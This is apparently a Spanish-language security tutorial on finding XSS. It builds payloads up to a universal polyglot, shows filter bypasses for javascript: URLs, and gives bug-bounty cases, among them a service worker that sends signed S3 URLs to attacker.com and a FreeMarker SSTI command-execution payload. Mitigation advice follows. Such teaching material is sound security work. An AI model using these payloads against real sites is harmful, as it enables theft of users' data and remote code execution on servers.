---
title: "Búsqueda eficaz de vulnerabilidades XSS: de alert() a RCE | DevSense"
description: "Domine el arte de encontrar y explotar Cross-Site Scripting (XSS). Aprenda a construir cargas útiles universales, evadir filtros y escalar XSS a RCE."
published: 2026-07-03
faq:
  - question: "¿Qué hace que una cadena de prueba sea una carga útil XSS universal (políglota)?"
    answer: "Una carga útil XSS universal está diseñada para ejecutarse con éxito en múltiples contextos HTML (atributos, texto plano, scripts o estilos) cerrando las etiquetas/comillas existentes e insertando una etiqueta activa (como iframe) sin romper el analizador HTML del navegador."
  - question: "¿Cómo puede un Service Worker secuestrar un bucket S3 para un ataque XSS?"
    answer: "Si una aplicación sirve archivos de usuario desde un bucket S3 compartido bajo el mismo Origin, un atacante puede cargar un Service Worker malicioso. Una vez registrado, intercepta todas las solicitudes de archivos futuras dentro de su scope, lo que permite robar firmas temporales y exfiltrar archivos."
  - question: "¿Cuál es la diferencia entre la inyección de plantillas del lado del cliente y SSTI?"
    answer: "La inyección de plantillas del lado del cliente (como AngularJS/VueJS) ejecuta JavaScript en el navegador de la víctima utilizando expresiones de plantilla renderizadas en el cliente. La inyección de plantillas del lado del servidor (SSTI) ejecuta código directamente en el servidor web dentro de plantillas como FreeMarker o Twig, lo que a menudo conduce a la ejecución remota de comandos (RCE)."
---

# Búsqueda eficaz de vulnerabilidades XSS: de alert() a RCE

El descubrimiento de vulnerabilidades de seguridad a menudo se ve como un arte secreto reservado para hackers de élite. Sin embargo, las amenazas del lado del cliente como **Cross-Site Scripting (XSS)** siguen un patrón lógico y estructurado. Al comprender la forma en que el navegador analiza el HTML y aprender a construir cargas útiles universales, cualquier desarrollador o ingeniero de control de calidad puede identificar eficazmente errores de XSS.

En esta guía, basada en presentaciones de Heisenbug y experiencia real en Bug Bounty, construiremos una metodología sólida para detectar XSS, aprenderemos cómo construir cargas útiles avanzadas y exploraremos casos reales donde simples inyecciones escalaron hasta el control del servidor.

---

## Contenido

* [Qué es XSS y por qué ocurre la vulnerabilidad](#what-is-xss)
* [La metodología de búsqueda manual](#hunting-methodology)
* [Construcción de la carga útil universal (del Nivel 0 al 1337)](#universal-payloads)
* [Evasión de filtros en el mundo real](#bypassing-restrictions)
* [Casos prácticos de Bug Bounty reales](#case-studies)
    * [Evasión de expresiones regulares en biz.mail.ru](#case-mailru)
    * [Ataque a bucket S3 mediante Service Worker](#case-s3)
    * [Inyección HTML en correos electrónicos y FreeMarker RCE](#case-ssti)
* [Mitigación & Defensa](#mitigations)

---

<a id="what-is-xss"></a>
## Qué es XSS y por qué ocurre la vulnerabilidad

**Cross-Site Scripting (XSS)** es una vulnerabilidad que permite a un atacante ejecutar código JavaScript arbitrario en el navegador de una víctima dentro del contexto de seguridad (Origin) del sitio web de destino.

Ocurre cuando una aplicación web toma información no confiable del usuario y la incluye en la página HTML generada sin la codificación o desinfección adecuada. Los navegadores no pueden distinguir entre el código original del sitio y las etiquetas inyectadas; simplemente ejecutan cualquier etiqueta HTML y código JavaScript que encuentren.

Normalmente categorizamos XSS en:
* **XSS almacenado (Stored XSS):** El código malicioso se guarda en la base de datos (por ejemplo, nombre de usuario, comentario) y se muestra más tarde a otros usuarios.
* **XSS reflejado (Reflected XSS):** El código malicioso se refleja inmediatamente en la respuesta del servidor, por lo general a través de un parámetro de URL o el cuerpo de una solicitud POST.

---

<a id="hunting-methodology"></a>
## La metodología de búsqueda manual

Los escáneres automáticos a menudo pasan por alto vulnerabilidades lógicas y fallan con los filtros de seguridad. Un enfoque manual de caja negra funciona de manera mucho más confiable:

1. **Inyecte una cadena de prueba única** (por ejemplo, `qweqwe`) en cada campo de entrada, parámetro de URL, encabezado o formulario de carga.
2. **Inspeccione el DOM de la página.** Abra DevTools (`F12`), busque su cadena (`Ctrl+F`) y observe cuántas veces aparece en la página.
3. **Analice el contexto de la inyección.** ¿Dónde se insertó la cadena? ¿En texto plano? ¿En un atributo `value`? ¿Dentro de un bloque `<script>`?
4. **Pruebe caracteres especiales** (`' " < > &`) para ver si están codificados (convertidos a entidades HTML como `&quot;`, `&lt;`, `&gt;`) o si se muestran en bruto.
5. **Construya y escale la carga útil** en función de los caracteres permitidos.

---

<a id="universal-payloads"></a>
## Construcción de la carga útil universal (del Nivel 0 al 1337)

En lugar de adaptar el código a cada campo manualmente, los cazadores de errores utilizan **cargas útiles universales** diseñadas para romper múltiples contextos de inserción simultáneamente.

### Nivel 0: El principiante
`"<script>alert()</script>"`
Esto solo funcionará si el desarrollador imprime la entrada directamente en el texto HTML:
```html
<p>¡Bienvenido, Usuario <script>alert()</script>!</p>
```

### Nivel 1: Escape de atributos
Si la entrada cae dentro del atributo de una etiqueta, la variante anterior falla porque permanece dentro de las comillas:
```html
<input name="search" value="<script>alert()</script>">
```
Necesitamos cerrar la comilla y la etiqueta misma: `">`
Nueva carga útil: `"><script>alert()</script>`
```html
<input name="search" value=""><script>alert()</script>">
```

### Nivel 2: Escape de etiquetas de servicio
Si la cadena cae dentro de etiquetas como `<title>`, `<style>`, `<textarea>` o `<script>`, el navegador trata todos los datos como texto o código JS y no renderiza etiquetas HTML.
Debemos cerrar esas etiquetas primero.
Nueva carga útil: `"></title></script><script>alert()</script>`

¿Qué pasa si el desarrollador usó comillas simples para el atributo? Añadimos `'` al principio:
Nueva carga útil: `'">></title></script><script>alert()</script>`

### Nivel 3: Uso de iframe
La etiqueta `<script>` a menudo es bloqueada por los WAF (Web Application Firewalls). En su lugar, es preferible utilizar un `<iframe>` con el evento `onload`:
Nueva carga útil: `'">></title></script><iframe onload='alert()'>`

El marco ejecuta el código JavaScript en el atributo `onload` inmediatamente después del renderizado, incluso sin especificar una fuente `src`.

### Nivel 1337: Slashes y políglotas
Los filtros avanzados eliminan espacios o buscan corchetes de cierre. Podemos evitarlos si:
* Reemplazamos espacios con barras diagonales (`/`).
* Permitimos que el navegador cierre la etiqueta por sí mismo (eliminamos `>`).
* Cerramos los posibles comentarios HTML (`-->`).
* Inyectamos expresiones de frameworks del lado del cliente como AngularJS o VueJS (`{{7*7}}`).

La carga útil universal final:
```html
'"/test/></title/></script/></style/-->{{7*7}}<iframe/onload='alert`1``<!--
```

Si se inserta en un atributo, produce:
```html
<input name="search" value=''"/test/></title/></script/></style/-->{{7*7}}<iframe/onload='alert`1``<!--'>
```
Aquí se crea con éxito nuestro propio atributo `test`, cuya presencia se puede verificar fácilmente con un script en la consola:
```javascript
if (document.querySelectorAll('*[test]').length > 0) {
    console.log("¡XSS detectado mediante inyección de atributo!");
}
```

---

<a id="bypassing-restrictions"></a>
## Evasión de filtros en el mundo real

### 1. Etiquetas no cerradas contra expresiones regulares
Si un filtro elimina todas las estructuras del tipo `<...>`, puede enviar una etiqueta no cerrada:
```html
<iframe/onload='alert()'
```
El navegador analizará la cadena, encontrará el final del documento, agregará el corchete de cierre por sí mismo y ejecutará el script.

### 2. Espacios en esquemas URL
Al verificar parámetros de redirección (por ejemplo, `returnUrl`), los desarrolladores a menudo verifican si la cadena comienza con la palabra `javascript:`.
* **Evasión con espacio:** Insertar un espacio o tabulación antes del esquema (`%20javascript:alert()`) evita la verificación simple `startsWith`, mientras que el navegador todavía considera el esquema como válido y ejecuta el código.
* **Sintaxis URL:** Una construcción del tipo `javascript://google.com/%0aalert()`. La doble barra convierte el texto siguiente en un comentario JS, y `%0a` (salto de línea) lo finaliza para ejecutar `alert()`.

---

<a id="case-studies"></a>
## Casos prácticos de Bug Bounty reales

<a id="case-mailru"></a>
### Caso 1: Evasión de expresiones regulares en biz.mail.ru
En un proyecto de Mail.ru, un error de servidor 500 redirigía al usuario a una página de error con un parámetro `from`. El botón «Actualizar» conducía a esa dirección.
* El intento de inyectar `javascript:alert()` se reemplazó por `https://`.
* La inyección de `%20javascript:alert()` (con un espacio al principio) evadió la expresión regular. El enlace malicioso se guardó y se ejecutó al hacer clic en el botón «Actualizar».

<a id="case-s3"></a>
### Caso 2: Ataque a bucket S3 mediante Service Worker
En una aplicación CRM privada, los usuarios cargaban documentos que se almacenaban en un bucket Amazon S3.
Al abrir un archivo, el servidor generaba una firma temporal y redirigía al dominio S3.
* Todos los archivos de los usuarios se alojaban en el mismo subdominio S3.
* El atacante cargó un archivo HTML con una carga útil XSS que ejecutaba JavaScript al abrirse.
* Para robar archivos de otros usuarios, el atacante cargó un `serviceworker.js` malicioso:
```javascript
// serviceworker.js
self.addEventListener('fetch', function(event) {
    event.respondWith(
        new Response("<iframe src='https://attacker.com/log?url=" + encodeURIComponent(event.request.url) + "'></iframe>", {
            headers: { 'Content-Type': 'text/html' }
        })
    );
});
```
* Se envió un enlace al archivo `exploit.html` a la víctima, lo que registró el Service Worker en toda la raíz del bucket S3.
* A partir de entonces, cuando la víctima intentaba abrir cualquier otro documento confidencial en el CRM, el Service Worker interceptaba la solicitud y transmitía el enlace firmado temporal al servidor del atacante.

<a id="case-ssti"></a>
### Caso 3: Inyección HTML en correos electrónicos y FreeMarker RCE
Una plataforma de marketing permitía personalizar plantillas HTML de correo electrónico.
* El atacante insertó las expresiones `${7*7}` y `{{7*7}}` en la plantilla de correo electrónico.
* Al previsualizar el correo, el servidor calculó la expresión y mostró `49`, revelando una vulnerabilidad **SSTI (Server-Side Template Injection)**.
* El motor de renderizado era el motor Java **FreeMarker**. Utilizando sus métodos de ejecución de comandos incorporados, la inyección se escaló a la ejecución de código en el servidor (**RCE**):
```html
[#assign cmd = 'freemarker.template.utility.Execute'?new()]
${cmd('id')}
```
El comando `id` se ejecutó en el sistema del servidor y el resultado (los privilegios de root) se mostró directamente en la ventana de vista previa del correo electrónico.

---

<a id="mitigations"></a>
## Mitigación & Defensa

1. **Nunca confíe en la entrada del usuario:** Valide todos los parámetros, encabezados y nombres de archivos.
2. **Codificación de salida adaptada al contexto:** Aplique el escape de caracteres especiales según el lugar de visualización:
    * En el cuerpo HTML: use `htmlspecialchars()`.
    * En el contexto JS: codifique mediante `json_encode()`.
    * En enlaces: permita únicamente los protocolos `http`/`https`.
3. **Implemente Content Security Policy (CSP):** Los encabezados estrictos de CSP prohíben la ejecución de scripts en línea y restringen las fuentes de carga de recursos.
4. **Aisle los archivos de los usuarios:** Aloje el contenido cargado en un dominio totalmente independiente (por ejemplo, `my-app-files.com`), libre de cookies de sesión y sin acceso a la API principal.
5. **Asegure los motores de plantillas:** Desactive el acceso a las API del sistema y a los entornos de aislamiento (sandboxes) al ejecutar plantillas de usuario en FreeMarker, Twig o Blade.
